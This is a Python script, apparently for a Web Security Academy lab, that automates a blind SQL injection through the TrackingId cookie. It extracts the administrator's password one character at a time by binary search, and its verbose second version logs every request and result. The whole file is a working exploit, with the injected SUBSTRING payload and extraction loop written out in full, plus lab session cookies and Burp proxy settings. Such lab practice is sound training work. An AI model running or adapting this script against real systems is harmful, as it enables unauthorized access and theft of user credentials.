# import requests
# import string

# # ─── CONFIG ───
# URL = "https://0a0c00040397914680c9175d008400dd.web-security-academy.net/"
# TRACKING_ID = "bLmMeqMo7Oe2abHc"
# SESSION = "5MrDXKqWPUtUGAnoMLygvjE4vnfP0qFr"
# PASSWORD_LEN = 20
# # ───────────────

# charset = "0123456789abcdefghijklmnopqrstuvwxyz"
# password = ""
# requests.packages.urllib3.disable_warnings()

# def oracle(position, condition):
#     payload = (
#         f"{TRACKING_ID}' AND SUBSTRING((SELECT password FROM users "
#         f"WHERE username='administrator'),{position},1){condition}-- "
#     )
#     r = requests.get(
#         URL,
#         cookies={"TrackingId": payload, "session": SESSION},
#         verify=False,
#         proxies={"http": "http://127.0.0.1:8080",
#                  "https": "http://127.0.0.1:8080"}   # watch in Burp; remove if unwanted
#     )
#     return "Welcome back" in r.text

# print("[*] Starting binary-search extraction...")

# for pos in range(1, PASSWORD_LEN + 1):
#     lo, hi = 0, len(charset) - 1      # inclusive bounds in charset index
#     while lo < hi:
#         mid = (lo + hi) // 2
#         cond = f" > '{charset[mid]}'"
#         if oracle(pos, cond):
#             lo = mid + 1              # char is strictly greater
#         else:
#             hi = mid                  # char is ≤ mid
#     password += charset[lo]
#     print(f"[+] Pos {pos:2d} = '{charset[lo]}'   password so far: {password}")

# print(f"\n[✔] DONE — administrator password: {password}")

import requests

# ─── CONFIG ───
URL = "https://0aec00b80378449980e62162001000f2.web-security-academy.net/"
TRACKING_ID = "LaaXQtao013x2QkA"
SESSION = "IMWGvfT3Mgu6krCSRH6TtlyX97qyT8VA"
PASSWORD_LEN = 20
SHOW_RESPONSE_SNIPPET = False   # ← set True to see raw page evidence of "Welcome back"
# ───────────────

charset = "0123456789abcdefghijklmnopqrstuvwxyz"
password = ""
requests.packages.urllib3.disable_warnings()

REQUEST_COUNT = 0

def line(char="─", n=72):
    print(char * n)

def oracle(position, condition):
    """Send ONE request. Return True if page says 'Welcome back'
    (= our injected SQL condition evaluated TRUE on the server)."""
    global REQUEST_COUNT
    REQUEST_COUNT += 1

    payload = (
        f"{TRACKING_ID}' AND SUBSTRING((SELECT password FROM users "
        f"WHERE username='administrator'),{position},1){condition}-- "
    )

    print(f"  ┌─ HTTP request #{REQUEST_COUNT}")
    print(f"  │  Cookie: TrackingId={payload}")

    r = requests.get(
        URL,
        cookies={"TrackingId": payload, "session": SESSION},
        verify=False,
        proxies={"http": "http://127.0.0.1:8080",
                 "https": "http://127.0.0.1:8080"},
    )

    result = "Welcome back" in r.text
    print(f"  │  'Welcome back' in page? {result}"
          f"  => SQL condition {condition!r} is {'TRUE' if result else 'FALSE'}")

    if SHOW_RESPONSE_SNIPPET:
        i = r.text.find("Welcome back")
        print(f"  │  raw evidence: ...{r.text[max(0, i-40): i+50]!r}...")

    print(f"  └─ oracle returns {result}")
    return result

line("═")
print("[*] Starting binary-search extraction")
print(f"[*] Target : administrator password, positions 1..{PASSWORD_LEN}")
print(f"[*] Charset: {charset!r}  (indexes 0..{len(charset)-1})")
line("═")

for pos in range(1, PASSWORD_LEN + 1):
    line()
    print(f"▶ POSITION {pos}")
    line()

    lo, hi = 0, len(charset) - 1
    print(f"  start: char could be any charset index in [{lo}..{hi}]"
          f"  i.e. {charset[lo]!r}..{charset[hi]!r}")

    step = 0
    while lo < hi:
        step += 1
        mid = (lo + hi) // 2
        guess = charset[mid]

        print(f"\n  ── step {step}: lo={lo} hi={hi} → mid={mid}"
              f" → question: is char at pos {pos}  >  {guess!r} ?")

        if oracle(pos, f" > '{guess}'"):
            print(f"  >> TRUE : char is greater than {guess!r}"
                  f" → throw away lower half → lo = {mid}+1 = {mid+1}")
            lo = mid + 1
        else:
            print(f"  >> FALSE: char is ≤ {guess!r}"
                  f" → throw away upper half → hi = {mid}")
            hi = mid

        print(f"  range now: [{lo}..{hi}]" + ("" if lo < hi else "  → converged!"))

    password += charset[lo]
    print(f"\n[+] Pos {pos:2d} = {charset[lo]!r}   password so far: {password}")

line("═")
print(f"[✔] DONE — administrator password: {password}")
print(f"[i] Total HTTP requests sent: {REQUEST_COUNT}")